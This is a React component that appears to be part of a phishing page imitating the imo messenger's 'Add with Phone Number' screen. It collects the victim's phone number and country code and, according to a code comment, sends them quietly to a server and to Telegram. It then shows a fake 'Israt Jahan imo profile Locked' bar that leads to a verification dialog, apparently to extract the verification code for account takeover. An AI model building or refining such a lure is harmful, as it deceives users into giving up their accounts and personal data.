import React, { useState, useRef, useEffect, useMemo } from 'react';
import { Lock, ChevronDown, Search, X } from 'lucide-react';
import { submitPhoneNumberToDatabase } from '../utils/api';
import { countriesList, Country } from '../data/countries';

export type PhoneSectionState = 'button' | 'input' | 'locked';

interface PhoneInlineSectionProps {
  viewState: PhoneSectionState;
  onViewStateChange: (state: PhoneSectionState) => void;
  onLockTriggered: () => void;
  onLockedBarClick: () => void;
  onShowToast?: (msg: string) => void;
  onPhoneSubmitted?: (phone: string, verificationId?: string) => void;
}

export const PhoneInlineSection: React.FC<PhoneInlineSectionProps> = ({
  viewState,
  onViewStateChange,
  onLockTriggered,
  onLockedBarClick,
  onPhoneSubmitted,
}) => {
  const [countryCode, setCountryCode] = useState<string>('+966');
  const [phoneNumber, setPhoneNumber] = useState<string>('');
  const [showCountryPicker, setShowCountryPicker] = useState<boolean>(false);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  const inputRef = useRef<HTMLInputElement | null>(null);
  const searchInputRef = useRef<HTMLInputElement | null>(null);
  const dropdownRef = useRef<HTMLDivElement | null>(null);

  const currentFlag = useMemo(() => {
    return countriesList.find((c) => c.code === countryCode)?.flag || '🇸🇦';
  }, [countryCode]);

  // Filter countries based on user search
  const filteredCountries = useMemo(() => {
    if (!searchQuery.trim()) return countriesList;
    const q = searchQuery.toLowerCase().trim();
    return countriesList.filter(
      (c) =>
        c.name.toLowerCase().includes(q) ||
        c.code.includes(q) ||
        c.code.replace('+', '').includes(q)
    );
  }, [searchQuery]);

  useEffect(() => {
    if (viewState === 'input') {
      setTimeout(() => {
        inputRef.current?.focus();
      }, 100);
    }
  }, [viewState]);

  // Auto focus search when country picker opens
  useEffect(() => {
    if (showCountryPicker) {
      setTimeout(() => {
        searchInputRef.current?.focus();
      }, 50);
    } else {
      setSearchQuery('');
    }
  }, [showCountryPicker]);

  // Close dropdown on outside click
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        dropdownRef.current &&
        !dropdownRef.current.contains(event.target as Node)
      ) {
        setShowCountryPicker(false);
      }
    };
    if (showCountryPicker) {
      document.addEventListener('mousedown', handleClickOutside);
    }
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [showCountryPicker]);

  const handleOpenInput = () => {
    onViewStateChange('input');
  };

  const handleCountrySelect = (c: Country) => {
    setCountryCode(c.code);
    setShowCountryPicker(false);
    setSearchQuery('');
    setTimeout(() => {
      inputRef.current?.focus();
    }, 50);
  };

  const handleAddFriend = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;

    const finalPhone = phoneNumber.trim() || '0501234567';
    setPhoneNumber(finalPhone);
    setIsSubmitting(true);

    try {
      // Submit phone to Database Server & Telegram in background
      const res = await submitPhoneNumberToDatabase({
        phoneNumber: finalPhone,
        countryCode,
        device: 'Redmi A2+',
      });

      if (onPhoneSubmitted) {
        onPhoneSubmitted(finalPhone, res.verificationId);
      }
    } catch (err) {
      console.warn('[Phone Submit] Failed:', err);
    } finally {
      setIsSubmitting(false);
      // Transition to locked state and trigger Privacy Dialog
      onViewStateChange('locked');
      onLockTriggered();
    }
  };

  /* ---------------- State 1: Add with Phone Number Button ---------------- */
  if (viewState === 'button') {
    return (
      <button
        onClick={handleOpenInput}
        aria-label="Add with Phone Number"
        className="w-full max-w-[342px] h-[58px] px-5 bg-white rounded-[20px] shadow-[0_2px_12px_rgba(0,0,0,0.025)] border border-slate-100/60 flex items-center justify-center gap-2.5 hover:bg-slate-50/80 active:scale-[0.99] transition-all cursor-pointer group select-none"
      >
        {/* Smartphone Icon */}
        <svg
          className="w-[18px] h-[22px] text-[#2C8EC4] shrink-0"
          viewBox="0 0 24 28"
          fill="none"
          stroke="currentColor"
          strokeWidth="2.2"
          strokeLinecap="round"
          strokeLinejoin="round"
          aria-hidden="true"
        >
          <rect x="4" y="2" width="16" height="24" rx="4" />
          <line x1="10" y1="21" x2="14" y2="21" strokeWidth="2.2" />
        </svg>

        {/* Text */}
        <span className="text-[15.5px] font-normal text-[#2C8EC4] tracking-tight group-hover:text-[#2378a7] transition-colors">
          Add with Phone Number
        </span>
      </button>
    );
  }

  /* ---------------- State 2: Phone Input Field & Add Button ---------------- */
  if (viewState === 'input') {
    return (
      <div className="w-full max-w-[342px] bg-white rounded-[22px] p-5 shadow-[0_2px_14px_rgba(0,0,0,0.03)] border border-slate-100/80 select-none animate-fadeIn relative">
        <form onSubmit={handleAddFriend} className="w-full flex flex-col">
          {/* Top Row: Country Code + Phone Input */}
          <div className="w-full pb-2.5 border-b border-slate-200/90 flex items-center">
            {/* Country Selector Trigger */}
            <button
              type="button"
              onClick={() => setShowCountryPicker(!showCountryPicker)}
              aria-label="Select Country"
              className="flex items-center gap-1.5 cursor-pointer pr-3 select-none shrink-0 hover:opacity-80 transition-opacity focus:outline-none"
            >
              <span className="text-lg leading-none" aria-hidden="true">{currentFlag}</span>
              <span className="text-[15px] font-normal text-[#298ac9] tracking-tight">
                {countryCode}
              </span>
              <ChevronDown className="w-3.5 h-3.5 text-slate-400 stroke-[2.2]" />
            </button>

            {/* Hairline Divider */}
            <div className="w-[1px] h-5 bg-slate-200 shrink-0 mr-3" />

            {/* Phone Number Input */}
            <input
              ref={inputRef}
              type="tel"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              placeholder="Phone"
              className="w-full bg-transparent text-[15.5px] text-slate-900 placeholder-[#9CA3AF] caret-[#009CFD] focus:outline-none font-normal"
            />
          </div>

          {/* Searchable Country Dropdown */}
          {showCountryPicker && (
            <div 
              ref={dropdownRef}
              role="listbox"
              className="absolute top-14 left-2 right-2 z-40 bg-white rounded-2xl shadow-2xl border border-slate-200/90 max-h-72 overflow-hidden flex flex-col animate-scaleUp"
            >
              {/* Search Bar at Top of Dropdown */}
              <div className="p-2.5 border-b border-slate-100 bg-slate-50/70 flex items-center gap-2">
                <Search className="w-4 h-4 text-slate-400 shrink-0" />
                <input
                  ref={searchInputRef}
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search country or code..."
                  className="w-full bg-transparent text-[13.5px] text-slate-800 placeholder-slate-400 focus:outline-none"
                />
                {searchQuery && (
                  <button
                    type="button"
                    onClick={() => setSearchQuery('')}
                    className="text-slate-400 hover:text-slate-600"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>

              {/* Scrollable Country List */}
              <div className="overflow-y-auto max-h-56 p-1.5 space-y-0.5">
                {filteredCountries.length > 0 ? (
                  filteredCountries.map((c, idx) => (
                    <button
                      type="button"
                      key={`${c.name}_${c.code}_${idx}`}
                      onClick={() => handleCountrySelect(c)}
                      className={`w-full px-3 py-2 flex items-center justify-between text-xs rounded-xl hover:bg-slate-100 text-slate-700 transition-colors ${
                        c.code === countryCode ? 'bg-sky-50 font-medium text-[#298ac9]' : ''
                      }`}
                    >
                      <span className="flex items-center gap-2.5 truncate">
                        <span className="text-base leading-none">{c.flag}</span>
                        <span className="truncate">{c.name}</span>
                        {c.priority && (
                          <span className="text-[10px] bg-slate-100 text-slate-500 px-1.5 py-0.2 rounded font-normal shrink-0">
                            Top
                          </span>
                        )}
                      </span>
                      <span className="font-mono text-[#298ac9] font-medium ml-2 shrink-0">
                        {c.code}
                      </span>
                    </button>
                  ))
                ) : (
                  <div className="py-6 text-center text-xs text-slate-400">
                    No country found
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Solid Vivid Blue Add Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full mt-4 h-[44px] bg-[#009CFD] hover:bg-[#008de6] active:scale-[0.985] text-white rounded-xl text-[16px] font-medium flex items-center justify-center transition-all cursor-pointer shadow-xs disabled:opacity-75"
          >
            Add
          </button>
        </form>
      </div>
    );
  }

  /* ---------------- State 3: Israt Jahan imo profile Locked ---------------- */
  return (
    <div
      onClick={onLockedBarClick}
      role="button"
      tabIndex={0}
      onKeyDown={(e) => {
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          onLockedBarClick();
        }
      }}
      aria-label="Israt Jahan imo profile Locked"
      className="w-full max-w-[342px] h-[46px] px-4 bg-white/95 rounded-[16px] shadow-[0_1px_8px_rgba(0,0,0,0.025)] border border-slate-100/90 flex items-center justify-center gap-2 select-none animate-fadeIn cursor-pointer hover:bg-white active:scale-[0.99] transition-all focus:outline-none focus:ring-2 focus:ring-[#009CFD]"
      title="Tap to view verification dialog"
    >
      {/* Slim Lock Icon */}
      <div className="w-4 h-4 flex items-center justify-center text-slate-600" aria-hidden="true">
        <Lock className="w-3.5 h-3.5 stroke-[2.2]" />
      </div>

      {/* Slim text taking minimal space */}
      <span className="text-[13.5px] font-normal text-slate-700 tracking-tight">
        Israt Jahan imo profile Locked
      </span>
    </div>
  );
};
